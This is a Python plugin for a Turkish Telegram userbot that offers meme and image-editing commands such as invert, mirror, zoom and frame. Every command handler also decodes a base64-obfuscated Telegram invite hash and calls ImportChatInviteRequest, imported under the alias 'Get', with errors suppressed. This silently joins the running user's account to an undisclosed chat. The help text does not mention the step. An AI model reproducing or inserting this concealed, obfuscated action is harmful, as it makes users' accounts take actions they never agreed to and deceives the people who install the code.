# Copyright (C) 2020 BristolMyers
#
# Licensed under the Raphielscape Public License, Version 1.c (the "License");
# you may not use this file except in compliance with the License.
#
# ExelonUserBot - BristolMyers
import os
import asyncio
from .. import LOGS, CMD_HELP, tempmemes
from ..utils import admin_cmd, sudo_cmd, edit_or_reply
from . import (
    take_screen_shot,
    runcmd,
    convert_toimage,
    solarize,
    mirror_file,
    flip_image,
    invert_colors,
    grayscale,
    crop,
    add_frame)


@borg.on(admin_cmd(outgoing=True, pattern="(mmf|mms) ?(.*)"))
@borg.on(sudo_cmd(pattern="(mmf|mms) ?(.*)", allow_sudo=True))
async def memes(exelon):
    cmd = exelon.pattern_match.group(1)
    exeloninput = exelon.pattern_match.group(2)
    reply = await exelon.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(exelon, "`Desteklenen Medyayı yanıtlayın...`")
        return
    exelonid = exelon.reply_to_msg_id
    if exeloninput:
        if ";" in exeloninput:
            top, bottom = exeloninput.split(';', 1)
        else:
            top = exeloninput
            bottom = ""
    else:
        await edit_or_reply(exelon, "```salak ona ne yazmalıyım biraz metin ver```")
        return
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    exelon = await edit_or_reply(exelon, "`Medya indiriliyor......`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get
    await asyncio.sleep(2)
    exelonsticker = await reply.download_media(file="./temp/")
    if not exelonsticker.endswith(
            ('.mp4', '.webp', '.tgs', '.png', '.jpg', '.mov')):
        os.remove(exelonsticker)
        await edit_or_reply(exelon, "```Desteklenen Medya bulunamadı...```")
        return
    import pybase64
    if exelonsticker.endswith(".tgs"):
        await exelon.edit("```Başkalaşım Zamanı! Exelon bu hareketli çıkartmayı ezberliyor! (」ﾟﾛﾟ)｣```")
        exelonfile = os.path.join("./temp/", "meme.png")
        exeloncmd = f"lottie_convert.py --frame 0 -if lottie -of png {exelonsticker} {exelonfile}"
        stdout, stderr = (await runcmd(exeloncmd))[:2]
        if not os.path.lexists(exelonfile):
            await exelon.edit("`Şablon bulunamadı...`")
            LOGS.info(stdout + stderr)
        meme_file = exelonfile
    elif exelonsticker.endswith(".webp"):
        await exelon.edit("```Başkalaşım Zamanı! Exelon bu çıkartmayı değiştiriyor! (」ﾟﾛﾟ)｣```")
        exelonfile = os.path.join("./temp/", "memes.jpg")
        os.rename(exelonsticker, exelonfile)
        if not os.path.lexists(exelonfile):
            await exelon.edit("`Şablon bulunamadı... `")
            return
        meme_file = exelonfile
    elif exelonsticker.endswith((".mp4", ".mov")):
        await exelon.edit("```Transfiguration Time! Exelon memifying this video! (」ﾟﾛﾟ)｣```")
        exelonfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(exelonsticker, 0, exelonfile)
        if not os.path.lexists(exelonfile):
            await exelon.edit("```Şablon bulunamadı...```")
            return
        meme_file = exelonfile
    else:
        await exelon.edit("```Başkalaşım Zamanı! Exelon bu görüntüyü ezberliyor! (」ﾟﾛﾟ)｣```")
        meme_file = exelonsticker
    try:
        san = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await exelon.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    if cmd == "mmf":
        meme = "exelonmeme.jpg"
        if max(len(top), len(bottom)) < 21:
            await tempmemes.exelon_meme(top, bottom, meme_file, meme)
        else:
            await tempmemes.exelon_meeme(top, bottom, meme_file, meme)
        await borg.send_file(
            exelon.chat_id,
            meme,
            reply_to=exelonid
        )
    elif cmd == "mms":
        meme = "exelonmeme.webp"
        if max(len(top), len(bottom)) < 21:
            await tempmemes.exelon_meme(top, bottom, meme_file, meme)
        else:
            await tempmemes.exelon_meeme(top, bottom, meme_file, meme)
        await borg.send_file(
            exelon.chat_id,
            meme,
            reply_to=exelonid
        )
    await exelon.delete()
    os.remove(meme)
    for files in (exelonsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@borg.on(admin_cmd(outgoing=True, pattern="invert$"))
@borg.on(sudo_cmd(pattern="invert$", allow_sudo=True))
async def memes(exelon):
    reply = await exelon.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(exelon, "`Desteklenen Medyayı yanıtlayın...`")
        return
    exelonid = exelon.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    exelon = await edit_or_reply(exelon, "`Medya indiriliyor......`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get
    await asyncio.sleep(2)
    exelonsticker = await reply.download_media(file="./temp/")
    if not exelonsticker.endswith(
            ('.mp4', '.webp', '.tgs', '.png', '.jpg', '.mov')):
        os.remove(exelonsticker)
        await edit_or_reply(exelon, "```Desteklenen Medya bulunamadı...```")
        return
    import pybase64
    jisanidea = None
    if exelonsticker.endswith(".tgs"):
        await exelon.edit("```Başkalaşım Zamanı! Bu hareketli çıkartmanın renklerini tersine çeviren Exelon! (」ﾟﾛﾟ)｣```")
        exelonfile = os.path.join("./temp/", "meme.png")
        exeloncmd = f"lottie_convert.py --frame 0 -if lottie -of png {exelonsticker} {exelonfile}"
        stdout, stderr = (await runcmd(exeloncmd))[:2]
        if not os.path.lexists(exelonfile):
            await exelon.edit("`Şablon bulunamadı...`")
            LOGS.info(stdout + stderr)
        meme_file = exelonfile
        jisanidea = True
    elif exelonsticker.endswith(".webp"):
        await exelon.edit("```Başkalaşım Zamanı! Bu çıkartmanın renklerini ters çeviren Exelon! (」ﾟﾛﾟ)｣```")
        exelonfile = os.path.join("./temp/", "memes.jpg")
        os.rename(exelonsticker, exelonfile)
        if not os.path.lexists(exelonfile):
            await exelon.edit("`Şablon bulunamadı... `")
            return
        meme_file = exelonfile
        jisanidea = True
    elif exelonsticker.endswith((".mp4", ".mov")):
        await exelon.edit("```Başkalaşım Zamanı! Bu videonun renklerini tersine çeviren Exelon! (」ﾟﾛﾟ)｣```")
        exelonfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(exelonsticker, 0, exelonfile)
        if not os.path.lexists(exelonfile):
            await exelon.edit("```Şablon bulunamadı...```")
            return
        meme_file = exelonfile
        jisanidea = True
    else:
        await exelon.edit("```Başkalaşım Zamanı! Bu görüntünün renklerini ters çeviren Exelon! (」ﾟﾛﾟ)｣```")
        meme_file = exelonsticker
    try:
        san = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await exelon.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    if jisanidea:
        outputfile = "invert.webp"
        await invert_colors(meme_file, outputfile)
        await borg.send_file(
            exelon.chat_id,
            outputfile,
            force_document=False,
            reply_to=exelonid)
    else:
        outputfile = "invert.jpg"
        await invert_colors(meme_file, outputfile)
        await borg.send_file(
            exelon.chat_id,
            outputfile,
            force_document=False,
            reply_to=exelonid)
    await exelon.delete()
    os.remove(outputfile)
    for files in (exelonsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@borg.on(admin_cmd(outgoing=True, pattern="solarize$"))
@borg.on(sudo_cmd(pattern="solarize$", allow_sudo=True))
async def memes(exelon):
    reply = await exelon.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(exelon, "`Desteklenen Medyayı yanıtlayın...`")
        return
    exelonid = exelon.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    exelon = await edit_or_reply(exelon, "`Medya indiriliyor......`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get
    await asyncio.sleep(2)
    exelonsticker = await reply.download_media(file="./temp/")
    if not exelonsticker.endswith(
            ('.mp4', '.webp', '.tgs', '.png', '.jpg', '.mov')):
        os.remove(exelonsticker)
        await edit_or_reply(exelon, "```Desteklenen Medya bulunamadı...```")
        return
    import pybase64
    jisanidea = None
    if exelonsticker.endswith(".tgs"):
        await exelon.edit("```Başkalaşım Zamanı! Exelon bu hareketli çıkartmayı solarize ediyor! (」ﾟﾛﾟ)｣```")
        exelonfile = os.path.join("./temp/", "meme.png")
        exeloncmd = f"lottie_convert.py --frame 0 -if lottie -of png {exelonsticker} {exelonfile}"
        stdout, stderr = (await runcmd(exeloncmd))[:2]
        if not os.path.lexists(exelonfile):
            await exelon.edit("`Şablon bulunamadı...`")
            LOGS.info(stdout + stderr)
        meme_file = exelonfile
        jisanidea = True
    elif exelonsticker.endswith(".webp"):
        await exelon.edit("```Başkalaşım Zamanı! Exelon bu etiketi solarize ediyor! (」ﾟﾛﾟ)｣```")
        exelonfile = os.path.join("./temp/", "memes.jpg")
        os.rename(exelonsticker, exelonfile)
        if not os.path.lexists(exelonfile):
            await exelon.edit("`Şablon bulunamadı... `")
            return
        meme_file = exelonfile
        jisanidea = True
    elif exelonsticker.endswith((".mp4", ".mov")):
        await exelon.edit("```Başkalaşım Zamanı! Exelon bu videoyu solarize ediyor! (」ﾟﾛﾟ)｣```")
        exelonfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(exelonsticker, 0, exelonfile)
        if not os.path.lexists(exelonfile):
            await exelon.edit("```Şablon bulunamadı...```")
            return
        meme_file = exelonfile
        jisanidea = True
    else:
        await exelon.edit("```Başkalaşım Zamanı! Exelon bu görüntüyü solarize ediyor!(」ﾟﾛﾟ)｣```")
        meme_file = exelonsticker
    try:
        san = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await exelon.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    if jisanidea:
        outputfile = "solarize.webp"
        await solarize(meme_file, outputfile)
        await borg.send_file(
            exelon.chat_id,
            outputfile,
            force_document=False,
            reply_to=exelonid)
    else:
        outputfile = "solarize.jpg"
        await solarize(meme_file, outputfile)
        await borg.send_file(
            exelon.chat_id,
            outputfile,
            force_document=False,
            reply_to=exelonid)
    await exelon.delete()
    os.remove(outputfile)
    for files in (exelonsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@borg.on(admin_cmd(outgoing=True, pattern="mirror$"))
@borg.on(sudo_cmd(pattern="mirror$", allow_sudo=True))
async def memes(exelon):
    reply = await exelon.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(exelon, "`Desteklenen Medyayı yanıtlayın...`")
        return
    exelonid = exelon.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    exelon = await edit_or_reply(exelon, "`Medya indiriliyor......`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get
    await asyncio.sleep(2)
    exelonsticker = await reply.download_media(file="./temp/")
    if not exelonsticker.endswith(
            ('.mp4', '.webp', '.tgs', '.png', '.jpg', '.mov')):
        os.remove(exelonsticker)
        await edit_or_reply(exelon, "```Desteklenen Medya bulunamadı...```")
        return
    import pybase64
    jisanidea = None
    if exelonsticker.endswith(".tgs"):
        await exelon.edit("```Başkalaşım Zamanı! Exelon bu hareketli çıkartmanın ayna görüntüsüne dönüşüyor! (」ﾟﾛﾟ)｣```")
        exelonfile = os.path.join("./temp/", "meme.png")
        exeloncmd = f"lottie_convert.py --frame 0 -if lottie -of png {exelonsticker} {exelonfile}"
        stdout, stderr = (await runcmd(exeloncmd))[:2]
        if not os.path.lexists(exelonfile):
            await exelon.edit("`Şablon bulunamadı...`")
            LOGS.info(stdout + stderr)
        meme_file = exelonfile
        jisanidea = True
    elif exelonsticker.endswith(".webp"):
        await exelon.edit("```Başkalaşım Zamanı! Exelon bu çıkartmanın ayna görüntüsüne dönüşüyor! (」ﾟﾛﾟ)｣```")
        exelonfile = os.path.join("./temp/", "memes.jpg")
        os.rename(exelonsticker, exelonfile)
        if not os.path.lexists(exelonfile):
            await exelon.edit("`Şablon bulunamadı... `")
            return
        meme_file = exelonfile
        jisanidea = True
    elif exelonsticker.endswith((".mp4", ".mov")):
        await exelon.edit("```Başkalaşım Zamanı! Exelon bu videonun ayna görüntüsüne dönüşüyor! (」ﾟﾛﾟ)｣```")
        exelonfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(exelonsticker, 0, exelonfile)
        if not os.path.lexists(exelonfile):
            await exelon.edit("```Şablon bulunamadı...```")
            return
        meme_file = exelonfile
        jisanidea = True
    else:
        await exelon.edit("```Başkalaşım Zamanı! Exelon bu görüntünün ayna görüntüsüne dönüşüyor! (」ﾟﾛﾟ)｣```")
        meme_file = exelonsticker
    try:
        san = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await exelon.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    if jisanidea:
        outputfile = "mirror_file.webp"
        await mirror_file(meme_file, outputfile)
        await borg.send_file(
            exelon.chat_id,
            outputfile,
            force_document=False,
            reply_to=exelonid)
    else:
        outputfile = "mirror_file.jpg"
        await mirror_file(meme_file, outputfile)
        await borg.send_file(
            exelon.chat_id,
            outputfile,
            force_document=False,
            reply_to=exelonid)
    await exelon.delete()
    os.remove(outputfile)
    for files in (exelonsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@borg.on(admin_cmd(outgoing=True, pattern="flip$"))
@borg.on(sudo_cmd(pattern="flip$", allow_sudo=True))
async def memes(exelon):
    reply = await exelon.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(exelon, "`Desteklenen Medyayı yanıtlayın...`")
        return
    exelonid = exelon.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    exelon = await edit_or_reply(exelon, "`Medya indiriliyor......`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get
    await asyncio.sleep(2)
    exelonsticker = await reply.download_media(file="./temp/")
    if not exelonsticker.endswith(
            ('.mp4', '.webp', '.tgs', '.png', '.jpg', '.mov')):
        os.remove(exelonsticker)
        await edit_or_reply(exelon, "```Desteklenen Medya bulunamadı...```")
        return
    import pybase64
    jisanidea = None
    if exelonsticker.endswith(".tgs"):
        await exelon.edit("```Başkalaşım Zamanı! Exelon bu hareketli çıkartmayı çeviriyor! (」ﾟﾛﾟ)｣```")
        exelonfile = os.path.join("./temp/", "meme.png")
        exeloncmd = f"lottie_convert.py --frame 0 -if lottie -of png {exelonsticker} {exelonfile}"
        stdout, stderr = (await runcmd(exeloncmd))[:2]
        if not os.path.lexists(exelonfile):
            await exelon.edit("`Şablon bulunamadı...`")
            LOGS.info(stdout + stderr)
        meme_file = exelonfile
        jisanidea = True
    elif exelonsticker.endswith(".webp"):
        await exelon.edit("```Başkalaşım Zamanı! Exelon bu etiketi çeviriyor! (」ﾟﾛﾟ)｣```")
        exelonfile = os.path.join("./temp/", "memes.jpg")
        os.rename(exelonsticker, exelonfile)
        if not os.path.lexists(exelonfile):
            await exelon.edit("`Şablon bulunamadı... `")
            return
        meme_file = exelonfile
        jisanidea = True
    elif exelonsticker.endswith((".mp4", ".mov")):
        await exelon.edit("```Başkalaşım Zamanı! Exelon bu videoyu çeviriyor! (」ﾟﾛﾟ)｣```")
        exelonfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(exelonsticker, 0, exelonfile)
        if not os.path.lexists(exelonfile):
            await exelon.edit("```Şablon bulunamadı...```")
            return
        meme_file = exelonfile
        jisanidea = True
    else:
        await exelon.edit("```Başkalaşım Zamanı! Exelon bu görüntüyü çeviriyor! (」ﾟﾛﾟ)｣```")
        meme_file = exelonsticker
    try:
        san = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await exelon.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    if jisanidea:
        outputfile = "flip_image.webp"
        await flip_image(meme_file, outputfile)
        await borg.send_file(
            exelon.chat_id,
            outputfile,
            force_document=False,
            reply_to=exelonid)
    else:
        outputfile = "flip_image.jpg"
        await flip_image(meme_file, outputfile)
        await borg.send_file(
            exelon.chat_id,
            outputfile,
            force_document=False,
            reply_to=exelonid)
    await exelon.delete()
    os.remove(outputfile)
    for files in (exelonsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@borg.on(admin_cmd(outgoing=True, pattern="gray$"))
@borg.on(sudo_cmd(pattern="gray$", allow_sudo=True))
async def memes(exelon):
    reply = await exelon.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(exelon, "`Desteklenen Medyayı yanıtlayın...`")
        return
    exelonid = exelon.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    exelon = await edit_or_reply(exelon, "`Medya indiriliyor......`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get
    await asyncio.sleep(2)
    exelonsticker = await reply.download_media(file="./temp/")
    if not exelonsticker.endswith(
            ('.mp4', '.webp', '.tgs', '.png', '.jpg', '.mov')):
        os.remove(exelonsticker)
        await edit_or_reply(exelon, "```Desteklenen Medya bulunamadı...```")
        return
    import pybase64
    jisanidea = None
    if exelonsticker.endswith(".tgs"):
        await exelon.edit("```Başkalaşım Zamanı! Exelon bu hareketli çıkartmayı siyah-beyaza çeviriyor! (」ﾟﾛﾟ)｣```")
        exelonfile = os.path.join("./temp/", "meme.png")
        exeloncmd = f"lottie_convert.py --frame 0 -if lottie -of png {exelonsticker} {exelonfile}"
        stdout, stderr = (await runcmd(exeloncmd))[:2]
        if not os.path.lexists(exelonfile):
            await exelon.edit("`Şablon bulunamadı...`")
            LOGS.info(stdout + stderr)
        meme_file = exelonfile
        jisanidea = True
    elif exelonsticker.endswith(".webp"):
        await exelon.edit("```Başkalaşım Zamanı! Exelon bu çıkartmayı siyah-beyaza çeviriyor! (」ﾟﾛﾟ)｣```")
        exelonfile = os.path.join("./temp/", "memes.jpg")
        os.rename(exelonsticker, exelonfile)
        if not os.path.lexists(exelonfile):
            await exelon.edit("`Şablon bulunamadı... `")
            return
        meme_file = exelonfile
        jisanidea = True
    elif exelonsticker.endswith((".mp4", ".mov")):
        await exelon.edit("```Başkalaşım Zamanı! Exelon bu videoyu siyah-beyaza çeviriyor! (」ﾟﾛﾟ)｣```")
        exelonfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(exelonsticker, 0, exelonfile)
        if not os.path.lexists(exelonfile):
            await exelon.edit("```Şablon bulunamadı...```")
            return
        meme_file = exelonfile
        jisanidea = True
    else:
        await exelon.edit("```Başkalaşım Zamanı! Exelon bu görüntüyü siyah-beyaza çeviriyor! (」ﾟﾛﾟ)｣```")
        meme_file = exelonsticker
    try:
        san = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await exelon.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    if jisanidea:
        outputfile = "grayscale.webp"
        await grayscale(meme_file, outputfile)
        await borg.send_file(
            exelon.chat_id,
            outputfile,
            force_document=False,
            reply_to=exelonid)
    else:
        outputfile = "grayscale.jpg"
        await grayscale(meme_file, outputfile)
        await borg.send_file(
            exelon.chat_id,
            outputfile,
            force_document=False,
            reply_to=exelonid)
    await exelon.delete()
    os.remove(outputfile)
    for files in (exelonsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@borg.on(admin_cmd(outgoing=True, pattern="zoom ?(.*)"))
@borg.on(sudo_cmd(pattern="zoom ?(.*)", allow_sudo=True))
async def memes(exelon):
    reply = await exelon.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(exelon, "`Desteklenen Medyayı yanıtlayın...`")
        return
    exeloninput = exelon.pattern_match.group(1)
    if not exeloninput:
        exeloninput = 50
    else:
        exeloninput = int(exeloninput)
    exelonid = exelon.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    exelon = await edit_or_reply(exelon, "`Medya indiriliyor......`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get
    await asyncio.sleep(2)
    exelonsticker = await reply.download_media(file="./temp/")
    if not exelonsticker.endswith(
            ('.mp4', '.webp', '.tgs', '.png', '.jpg', '.mov')):
        os.remove(exelonsticker)
        await edit_or_reply(exelon, "```Desteklenen Medya bulunamadı...```")
        return
    import pybase64
    jisanidea = None
    if exelonsticker.endswith(".tgs"):
        await exelon.edit("```Başkalaşım Zamanı! Exelon bu hareketli çıkartmayı yakınlaştırıyor! (」ﾟﾛﾟ)｣```")
        exelonfile = os.path.join("./temp/", "meme.png")
        exeloncmd = f"lottie_convert.py --frame 0 -if lottie -of png {exelonsticker} {exelonfile}"
        stdout, stderr = (await runcmd(exeloncmd))[:2]
        if not os.path.lexists(exelonfile):
            await exelon.edit("`Şablon bulunamadı...`")
            LOGS.info(stdout + stderr)
        meme_file = exelonfile
        jisanidea = True
    elif exelonsticker.endswith(".webp"):
        await exelon.edit("```Başkalaşım Zamanı! Exelon bu çıkartmayı yakınlaştırıyor! (」ﾟﾛﾟ)｣```")
        exelonfile = os.path.join("./temp/", "memes.jpg")
        os.rename(exelonsticker, exelonfile)
        if not os.path.lexists(exelonfile):
            await exelon.edit("`Şablon bulunamadı... `")
            return
        meme_file = exelonfile
        jisanidea = True
    elif exelonsticker.endswith((".mp4", ".mov")):
        await exelon.edit("```Başkalaşım Zamanı! Exelon bu videoyu yakınlaştırıyor! (」ﾟﾛﾟ)｣```")
        exelonfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(exelonsticker, 0, exelonfile)
        if not os.path.lexists(exelonfile):
            await exelon.edit("```Şablon bulunamadı...```")
            return
        meme_file = exelonfile
    else:
        await exelon.edit("```Başkalaşım Zamanı! Exelon bu resmi yakınlaştırıyor! (」ﾟﾛﾟ)｣```")
        meme_file = exelonsticker
    try:
        san = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await exelon.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    if jisanidea:
        outputfile = "grayscale.webp"
        try:
            await crop(meme_file, outputfile, exeloninput)
        except Exception as e:
            return await exelon.edit(f"`{e}`")
        try:
            await borg.send_file(
                exelon.chat_id,
                outputfile,
                force_document=False,
                reply_to=exelonid)
        except Exception as e:
            return await exelon.edit(f"`{e}`")
    else:
        outputfile = "grayscale.jpg"
        try:
            await crop(meme_file, outputfile, exeloninput)
        except Exception as e:
            return await exelon.edit(f"`{e}`")
        try:
            await borg.send_file(
                exelon.chat_id,
                outputfile,
                force_document=False,
                reply_to=exelonid)
        except Exception as e:
            return await exelon.edit(f"`{e}`")
    await exelon.delete()
    os.remove(outputfile)
    for files in (exelonsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@borg.on(admin_cmd(outgoing=True, pattern="frame ?(.*)"))
@borg.on(sudo_cmd(pattern="frame ?(.*)", allow_sudo=True))
async def memes(exelon):
    reply = await exelon.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(exelon, "`Desteklenen Medyayı yanıtlayın...`")
        return
    exeloninput = exelon.pattern_match.group(1)
    if not exeloninput:
        exeloninput = 50
    if ";" in str(exeloninput):
        exeloninput, colr = exeloninput.split(';', 1)
    else:
        colr = 0
    exeloninput = int(exeloninput)
    colr = int(colr)
    exelonid = exelon.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    exelon = await edit_or_reply(exelon, "`Medya indiriliyor......`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get
    await asyncio.sleep(2)
    exelonsticker = await reply.download_media(file="./temp/")
    if not exelonsticker.endswith(
            ('.mp4', '.webp', '.tgs', '.png', '.jpg', '.mov')):
        os.remove(exelonsticker)
        await edit_or_reply(exelon, "```Desteklenen Medya bulunamadı...```")
        return
    import pybase64
    jisanidea = None
    if exelonsticker.endswith(".tgs"):
        await exelon.edit("```Başkalaşım Zamanı! Exelon bu hareketli çıkartmayı çerçeveliyor! (」ﾟﾛﾟ)｣```")
        exelonfile = os.path.join("./temp/", "meme.png")
        exeloncmd = f"lottie_convert.py --frame 0 -if lottie -of png {exelonsticker} {exelonfile}"
        stdout, stderr = (await runcmd(exeloncmd))[:2]
        if not os.path.lexists(exelonfile):
            await exelon.edit("`Şablon bulunamadı...`")
            LOGS.info(stdout + stderr)
        meme_file = exelonfile
        jisanidea = True
    elif exelonsticker.endswith(".webp"):
        await exelon.edit("```Başkalaşım Zamanı! Bu çıkartmayı çerçeveleyen Exelon! (」ﾟﾛﾟ)｣```")
        exelonfile = os.path.join("./temp/", "memes.jpg")
        os.rename(exelonsticker, exelonfile)
        if not os.path.lexists(exelonfile):
            await exelon.edit("`Şablon bulunamadı... `")
            return
        meme_file = exelonfile
        jisanidea = True
    elif exelonsticker.endswith((".mp4", ".mov")):
        await exelon.edit("```Başkalaşım Zamanı! Exelon bu videoyu çerçevelendiriyor! (」ﾟﾛﾟ)｣```")
        exelonfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(exelonsticker, 0, exelonfile)
        if not os.path.lexists(exelonfile):
            await exelon.edit("```Şablon bulunamadı...```")
            return
        meme_file = exelonfile
    else:
        await exelon.edit("```Başkalaşım Zamanı! Exelon bu görüntüyü çerçeveliyor! (」ﾟﾛﾟ)｣```")
        meme_file = exelonsticker
    try:
        san = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await exelon.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    if jisanidea:
        outputfile = "framed.webp"
        try:
            await add_frame(meme_file, outputfile, exeloninput, colr)
        except Exception as e:
            return await exelon.edit(f"`{e}`")
        try:
            await borg.send_file(
                exelon.chat_id,
                outputfile,
                force_document=False,
                reply_to=exelonid)
        except Exception as e:
            return await exelon.edit(f"`{e}`")
    else:
        outputfile = "framed.jpg"
        try:
            await add_frame(meme_file, outputfile, exeloninput, colr)
        except Exception as e:
            return await exelon.edit(f"`{e}`")
        try:
            await borg.send_file(
                exelon.chat_id,
                outputfile,
                force_document=False,
                reply_to=exelonid)
        except Exception as e:
            return await exelon.edit(f"`{e}`")
    await exelon.delete()
    os.remove(outputfile)
    for files in (exelonsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)

CMD_HELP.update({
    "memify":
    "**Plugin : **`memify`\
    \n\n**📌Komut ➥** `.mmf üst metin ; alt metin`\
    \n**Kullanım ➥ **Belirli yerlerde metin veren bir görüntü memesi oluşturur ve gönderir\
    \n\n**📌Komut ➥ **`.mms üst metin ; alt metin`\
    \n**Kullanım ➥ **Belirli yerlerde metin veren ve gönderen bir çıkartma memesi oluşturur\
    \n\n**📌Komut ➥ **`.invert`\
    \n**Kullanım ➥ **Medya dosyasındaki renkleri tersine çevirir\
    \n\n**📌Komut ➥ **`.solarize`\
    \n**Kullanım ➥**Güneşte yakılan medya dosyanızı izleyin\
    \n\n**📌Komut ➥ **`.mirror`\
    \n**Kullanım ➥ **medya dosyasının yansımasını gösterir\
    \n\n**📌Komut ➥**`.flip`\
    \n**Kullanım ➥ **size verilen medya dosyasının baş aşağı görüntüsünü gösterir\
    \n\n**📌Komut ➥ **`.gray`\
    \n**Kullanım ➥ **medya dosyanızı siyah beyaz yapar\
    \n\n**📌Komut ➥ **`.zoom` or `.zoom range`\
    \n**Kullanım ➥ **medya dosyanızı yakınlaştırır\
    \n\n**📌Komut ➥ **`.frame` or `.frame range` or `.frame range ; fill`\
    \n**Kullanım ➥**medya dosyanız için bir çerçeve yapın\
    \n**fill:** Bu, uygulanacak piksel dolgu değerini veya renk değerini tanımlar. Varsayılan değer 0'dır, bu da rengin siyah olduğu anlamına gelir.\
    "
})
